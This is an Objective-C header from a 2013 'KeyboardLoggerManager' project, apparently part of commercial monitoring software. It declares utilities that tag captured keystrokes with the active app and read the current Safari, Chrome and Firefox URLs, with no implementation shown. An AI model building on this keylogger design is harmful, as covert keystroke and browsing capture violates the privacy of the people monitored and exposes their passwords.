//
//  KeyboardLoggerUtils.h
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 10/30/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface KeyboardLoggerUtils : NSObject {

}
+ (NSString *) getCurrentAppID;
+ (NSString *) safariUrl;
+ (NSString *) chromeUrl;
+ (NSString *) firefoxUrl;
+ (NSMutableDictionary *) mergeKeyInfo: (NSDictionary *) aKeyInfo1 withKeyInfo: (NSDictionary *) aKeyInfo2;
+ (NSMutableDictionary *) previousKeyInfoWithArray: (NSArray *) aKeyLoggerArray newKeyInfo: (NSDictionary *) aNewKeyInfo;
+ (NSMutableDictionary *) keyInfoWithKeyString:(NSString *)aKeyString rawKeyRep: (NSString *) aRawKeyRep activeAppInfo:(NSDictionary *)aActiveAppInfo;

+ (NSArray *) windowDictsOfSavePanelService;
+ (NSDictionary *) embeddedWindowDictWithPID: (pid_t) aPID;

@end
